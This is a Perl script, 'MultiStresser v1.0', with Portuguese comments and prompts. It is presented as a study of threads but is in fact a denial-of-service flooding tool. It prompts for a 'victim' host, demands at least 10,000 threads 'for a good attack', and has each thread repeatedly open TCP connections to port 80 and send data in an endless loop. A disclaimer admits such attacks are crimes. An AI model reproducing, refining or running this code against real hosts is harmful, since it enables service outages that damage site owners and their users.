#!/usr/bin/perl 
#
# [!] CÓDIGO FEITO PARA ESTUDOS DE THREADS EM LINGUAGEM PERL [!]
#
# USE, EDITE, COMPILE. MAS SEMPRE DISTRIBUA O CÓDIGO FONTE!
# CONHECIMENTO DEVE SER LIVRE E DE TODOS! 
#
# CODED BY: HackerOrientado
#
# Me sigam no twitter -> @HackerOrientado
# Facebook -> facebook.com/CalsEvolution
# Página Ciência Hacker -> facebook.com/CienciaHacker
# Grupo Ciência Hacker -> facebook.com/groups/cienciahacker/
# Página no Facebook do Inurl Brasil -> facebook.com/InurlBrasil
# Blog Inurl Brasil -> blog.inurl.com.br/
#

############### MÓDULOS
use warnings;
use strict;
use threads;
use threads::shared;
use IO::Socket::INET;
use utf8;

binmode(STDOUT, ":utf8"); # CODE PARA SAÍDA utf8
system 'clear';

############### DECLARAÇÃO DE VARIAVÉIS
my (  $OS, $baner, $termo, $threads, $vitima, $VezesDeAtaque, $i, $threadsJoin, $socket, $t );
$OS = $^O;

$termo = "                                                 [\!] CÓDIGO FEITO PARA ESTUDOS DE THREADS EM LINGUAGEM PERL [\!]

Ao usar este script, você concorda que esta ciente de que ao realizar um ataque de negação de serviço (DoS) é crime, e que qualquer ataque realizado a um servidor, IP, site, computador ou qualquer outro dispositivo eletrônico ligado ou não a internet sem conscientização do dono resultará em pena de prisão e/ou multa perante as leis do Estado em que ataca e/ou esta atacando, e que você (usuário final) é totalmente responsável pelo uso deste script.

Eu não me responsabilizo pelo mal uso deste script. ";

$baner = "
##     ## ##     ## ##       ######## ####           ######  ######## ########  ########  ######   ######  ######## ########  
###   ### ##     ## ##          ##     ##           ##    ##    ##    ##     ## ##       ##    ## ##    ## ##       ##     ## 
#### #### ##     ## ##          ##     ##           ##          ##    ##     ## ##       ##       ##       ##       ##     ## 
## ### ## ##     ## ##          ##     ##            ######     ##    ########  ######    ######   ######  ######   ########  
##     ## ##     ## ##          ##     ##                 ##    ##    ##   ##   ##             ##       ## ##       ##   ##   
##     ## ##     ## ##          ##     ##           ##    ##    ##    ##    ##  ##       ##    ## ##    ## ##       ##    ##  
##     ##  #######  ########    ##    ####           ######     ##    ##     ## ########  ######   ######  ######## ##     ## 
                                                                                                            
                                                                                                                             v1.0";
############### VERIFICAÇÃO DO SISTEMA OPERACIONAL
if ( $OS ne 'linux' ) {
	system "cls";
	print "\t\t\t\t[\!] AVISO [\!]\n\n";
	print "Desculpe mas e altamente recomendado o uso de sistemas operacionais Linux pelo \nfato de ser mais leve\!\n";
	print "Sistema Windows ou Mac consomem muita memória RAM e este script vai necessitar de bastante.\n";
	print "Não importa se você tem 16 Gigas ou mais, ele foi realmente pensando no uso em \ndistribuições Linux\n";
	sleep 1;
	exit (0);
}

print $baner;
print "\n\n";

print $termo;
print "\n\n";

############### ENTRADA DA QUANTIDADE DE THREADS A SEREM USADAS
info1:
print "Digite a quantidade de threads a serem usadas.\n";
print "--> ";
$threads = <STDIN>; chomp $threads;
if ( $threads < 10000 ) {
    print "\nÉ recomendado um numero maior 10000 para um ataque bom.\n";
    goto info1;
}

############### ENTRADA DO URL/HOST 
print "\n\n";
print "Digite o URL/HOST da vítima\n";
print "--> ";
$vitima = <STDIN>; chomp $vitima;
if ( $vitima !~ /www./ ) {
	$vitima = "www.".$vitima;
}

############### CÓDIGO PARA CRIAÇÃO AUTOMÁTICA DE THREADS >=D
for ( $i = 0; $i < $threads; $i++ ) {
    $threadsJoin = $threads.$i;
    $threadsJoin = threads->create( 'threads', '1' );
}

############### SUB ROTINAS PARA SER CHAMADA POR CADA THREAD >=D
sub threads {
	ataque:
	$socket = IO::Socket::INET->new (
		PeerAddr 	=> $vitima, 
		PeerPort 	=> '80', 
		Proto 		=> 'tcp' ) or die "\n\n[\!] NÃO FOI POSSÍVEL SE CONECTAR AO IP OU PORTA. [\!] \n[\!] PROVAVELMENTE O SERVIDOR CAIU [\!]\n\n";
		
	for ( $t = 0; $t < 64000; $t++ ) {
		print "Atacando $vitima na porta 80\!\! by MultiStresser\n";
		send ($socket, '64000', '1', '1');
	}
	goto ataque;
}

# EoF